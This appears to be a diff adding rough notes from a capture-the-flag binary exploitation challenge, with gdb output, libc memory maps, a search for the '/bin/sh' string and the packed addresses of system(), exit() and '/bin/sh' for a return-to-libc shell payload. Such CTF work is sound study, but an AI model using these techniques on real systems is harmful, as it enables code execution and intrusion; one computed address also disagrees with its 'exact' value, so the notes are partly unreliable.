@@ -1,0 +1,66 @@
+https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc
+
+(gdb) b main
+Breakpoint 1 at 0x4013aa
+(gdb) r
+Starting program: /home/kali/Documents/ctf/htb_cyber_apocalypse2023/pwn_pandoras_box/challenge/pb 
+warning: Expected absolute pathname for libpthread in the inferior, but got ./glibc/libc.so.6.
+warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.
+
+Breakpoint 1, 0x00000000004013aa in main ()
+(gdb) checksec
+Undefined command: "checksec".  Try "help".
+(gdb) p system
+$1 = {<text variable, no debug info>} 0x7ffff7de3d60 <system>
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0x7ffff7dd85f0 <exit>
+(gdb) info proc map
+process 59651
+Mapped address spaces:
+
+          Start Addr           End Addr       Size     Offset  Perms  objfile
+            0x400000           0x401000     0x1000        0x0  r--p   /home/kali/Documents/ctf/htb_cyber_apocalypse2023/pwn_pandoras_box/challenge/pb
+            0x401000           0x402000     0x1000     0x1000  r-xp   /home/kali/Documents/ctf/htb_cyber_apocalypse2023/pwn_pandoras_box/challenge/pb
+            0x402000           0x403000     0x1000     0x2000  r--p   /home/kali/Documents/ctf/htb_cyber_apocalypse2023/pwn_pandoras_box/challenge/pb
+            0x403000           0x404000     0x1000     0x2000  r--p   /home/kali/Documents/ctf/htb_cyber_apocalypse2023/pwn_pandoras_box/challenge/pb
+            0x404000           0x405000     0x1000     0x3000  rw-p   /home/kali/Documents/ctf/htb_cyber_apocalypse2023/pwn_pandoras_box/challenge/pb
+      0x7ffff7d90000     0x7ffff7d93000     0x3000        0x0  rw-p   
+      0x7ffff7d93000     0x7ffff7dbb000    0x28000        0x0  r--p   /home/kali/Documents/ctf/htb_cyber_apocalypse2023/pwn_pandoras_box/challenge/glibc/libc.so.6
+      0x7ffff7dbb000     0x7ffff7f50000   0x195000    0x28000  r-xp   /home/kali/Documents/ctf/htb_cyber_apocalypse2023/pwn_pandoras_box/challenge/glibc/libc.so.6
+      0x7ffff7f50000     0x7ffff7fa8000    0x58000   0x1bd000  r--p   /home/kali/Documents/ctf/htb_cyber_apocalypse2023/pwn_pandoras_box/challenge/glibc/libc.so.6
+      0x7ffff7fa8000     0x7ffff7fac000     0x4000   0x214000  r--p   /home/kali/Documents/ctf/htb_cyber_apocalypse2023/pwn_pandoras_box/challenge/glibc/libc.so.6
+      0x7ffff7fac000     0x7ffff7fae000     0x2000   0x218000  rw-p   /home/kali/Documents/ctf/htb_cyber_apocalypse2023/pwn_pandoras_box/challenge/glibc/libc.so.6
+      0x7ffff7fae000     0x7ffff7fbd000     0xf000        0x0  rw-p   
+      0x7ffff7fbd000     0x7ffff7fc1000     0x4000        0x0  r--p   [vvar]
+      0x7ffff7fc1000     0x7ffff7fc3000     0x2000        0x0  r-xp   [vdso]
+      0x7ffff7fc3000     0x7ffff7fc5000     0x2000        0x0  r--p   /home/kali/Documents/ctf/htb_cyber_apocalypse2023/pwn_pandoras_box/challenge/glibc/ld-linux-x86-64.so.2
+      0x7ffff7fc5000     0x7ffff7fef000    0x2a000     0x2000  r-xp   /home/kali/Documents/ctf/htb_cyber_apocalypse2023/pwn_pandoras_box/challenge/glibc/ld-linux-x86-64.so.2
+      0x7ffff7fef000     0x7ffff7ffa000     0xb000    0x2c000  r--p   /home/kali/Documents/ctf/htb_cyber_apocalypse2023/pwn_pandoras_box/challenge/glibc/ld-linux-x86-64.so.2
+      0x7ffff7ffb000     0x7ffff7ffd000     0x2000    0x37000  r--p   /home/kali/Documents/ctf/htb_cyber_apocalypse2023/pwn_pandoras_box/challenge/glibc/ld-linux-x86-64.so.2
+      0x7ffff7ffd000     0x7ffff7fff000     0x2000    0x39000  rw-p   /home/kali/Documents/ctf/htb_cyber_apocalypse2023/pwn_pandoras_box/challenge/glibc/ld-linux-x86-64.so.2
+      0x7ffffffde000     0x7ffffffff000    0x21000        0x0  rw-p   [stack]
+
+
+┌──(kali㉿kali)-[~/…/ctf/htb_cyber_apocalypse2023/pwn_pandoras_box/challenge]
+└─$ strings -a -t x /home/kali/Documents/ctf/htb_cyber_apocalypse2023/pwn_pandoras_box/challenge/glibc/libc.so.6 | grep "/bin/sh"
+ 1d8698 /bin/sh
+
+
+  0x7ffff7d93000
++ 0x0000001d8698
+----------------
+  0x7ffff7f6b698
+  
+(gdb) x/s 0x00007ffff7f6b698
+0x7ffff7f6b698: "/bin/sh"
+EXACT location = 0x7ffff7f6b69e
+
+system(): 00007ffff7de3d60
+exit(): 7ffff7dd85f0
+
+buffer: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
+
+address of system(): \x60\x3d\xde\xf7\xff\x7f
+ret address of exit(): \xf0\x85\xdd\xf7\xff\x7f
+/bin/sh location: \x9e\xb6\xf6\xf7\xff\x7f
+
